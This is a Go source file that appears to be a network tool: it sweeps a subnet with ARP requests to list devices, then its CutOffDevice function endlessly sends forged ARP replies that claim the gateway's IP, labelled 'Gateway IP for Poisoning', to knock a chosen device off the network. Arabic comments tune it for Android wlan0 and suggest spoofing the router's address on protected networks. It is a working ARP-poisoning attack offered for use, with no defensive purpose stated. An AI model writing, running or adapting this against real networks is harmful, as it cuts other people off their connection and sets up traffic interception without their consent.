package networkscan

import (
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type Device struct {
	IP       net.IP
	MAC      net.HardwareAddr
	HOSTNAME []string
}

type NetworkScanner struct {
	handle   *pcap.Handle
	localIP  net.IP
	localMAC net.HardwareAddr
	iface    string
	logger   *log.Logger
}

func NewNetworkScanner(ifaceName string) (*NetworkScanner, error) {
	logFile, err := os.OpenFile("network_errors.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return nil, fmt.Errorf("could not open log file: %v", err)
	}
	logger := log.New(logFile, "NET_ERROR: ", log.LstdFlags|log.Lshortfile)

	// تغيير وضع Promiscuous إلى false لضمان عمله على كروت شبكة أندرويد الحديثة wlan0
	handle, err := pcap.OpenLive(ifaceName, 65536, false, pcap.BlockForever)
	if err != nil {
		logger.Printf("Error opening device %s: %v", ifaceName, err)
		fmt.Printf("[FATAL] فشل فتح الواجهة %s: %v\n", ifaceName, err)
		return nil, err
	}

	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		handle.Close()
		return nil, err
	}

	addrs, err := iface.Addrs()
	if err != nil || len(addrs) == 0 {
		handle.Close()
		return nil, fmt.Errorf("no addresses found for interface %s", ifaceName)
	}

	var localIP net.IP
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				localIP = ipnet.IP.To4()
				break
			}
		}
	}

	if localIP == nil {
		handle.Close()
		return nil, fmt.Errorf("no valid IPv4 address for %s", ifaceName)
	}

	return &NetworkScanner{
		handle:   handle,
		localIP:  localIP,
		localMAC: iface.HardwareAddr,
		iface:    ifaceName,
		logger:   logger,
	}, nil
}

func IncrementIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func (ns *NetworkScanner) SendARPRequest(dstIP net.IP) {
	ethLayer := &layers.Ethernet{
		SrcMAC:       ns.localMAC,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}

	arpLayer := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   []byte(ns.localMAC),
		SourceProtAddress: []byte(ns.localIP), // في الشبكات المحمية جداً يمكن تزييف هذا ليصبح IP الراوتر
		DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
		DstProtAddress:    []byte(dstIP),
	}

	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	gopacket.SerializeLayers(buffer, opts, ethLayer, arpLayer)
	ns.handle.WritePacketData(buffer.Bytes())
}

func (ns *NetworkScanner) SendARPReply(targetMAC net.HardwareAddr, targetIP net.IP, localIP net.IP) {
	ethLayer := &layers.Ethernet{
		SrcMAC:       ns.localMAC,
		DstMAC:       targetMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	arpLayer := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   ns.localMAC,
		SourceProtAddress: localIP, // Gateway IP for Poisoning
		DstHwAddress:      targetMAC,
		DstProtAddress:    targetIP,
	}

	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	gopacket.SerializeLayers(buffer, opts, ethLayer, arpLayer)
	ns.handle.WritePacketData(buffer.Bytes())
}

func (ns *NetworkScanner) HandleARPPacket(packet gopacket.Packet) Device {
	arpLayer := packet.Layer(layers.LayerTypeARP)
	if arpLayer != nil {
		arp, _ := arpLayer.(*layers.ARP)
		if arp.Operation == layers.ARPReply || arp.Operation == layers.ARPRequest {
			ip := net.IP(arp.SourceProtAddress)
			mac := net.HardwareAddr(arp.SourceHwAddress)
			return Device{
				IP:       ip,
				MAC:      mac,
				HOSTNAME: nil,
			}
		}
	}
	return Device{}
}

func (ns *NetworkScanner) NetScan(targetNet string) ([]Device, error) {
	_, ipNet, err := net.ParseCIDR(targetNet)
	if err != nil {
		return nil, err
	}

	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
	defer cancel()

	seen := make(map[string]Device)
	packetSource := gopacket.NewPacketSource(ns.handle, ns.handle.LinkType())
	packets := packetSource.Packets()

	// Sending Requests in a goroutine
	go func() {
		ip := make(net.IP, len(ipNet.IP))
		copy(ip, ipNet.IP)
		for ip := ip.Mask(ipNet.Mask); ipNet.Contains(ip); IncrementIP(ip) {
			if ip.Equal(ns.localIP) {
				continue
			}
			ns.SendARPRequest(ip)
			time.Sleep(30 * time.Millisecond) // تسريع الإرسال بدلاً من 100ms
		}
	}()

	// Listening loop with context deadline to prevent hanging
	for {
		select {
		case <-ctx.Done():
			return mapToSlice(seen), nil
		case packet, ok := <-packets:
			if !ok {
				return mapToSlice(seen), nil
			}
			device := ns.HandleARPPacket(packet)
			if device.IP != nil && device.MAC != nil && !device.IP.Equal(ns.localIP) {
				key := device.IP.String()
				if _, exists := seen[key]; !exists {
					seen[key] = device
				}
			}
		}
	}
}

func mapToSlice(m map[string]Device) []Device {
	devices := make([]Device, 0, len(m))
	for _, d := range m {
		devices = append(devices, d)
	}
	return devices
}

func (ns *NetworkScanner) CutOffDevice(device Device, gateway string) {
	routerIp := net.ParseIP(gateway).To4()
	if routerIp == nil {
		return
	}
	for {
		err := ns.handle.WritePacketData([]byte{})
		if err != nil {
			newNs, reopenErr := NewNetworkScanner(ns.iface)
			if reopenErr == nil {
				ns.handle = newNs.handle
			} else {
				time.Sleep(2 * time.Second)
				continue
			}
		}
		ns.SendARPReply(device.MAC, device.IP, routerIp)
		time.Sleep(1500 * time.Millisecond)
	}
}

func (ns *NetworkScanner) Close() {
	if ns.handle != nil {
		ns.handle.Close()
	}
}
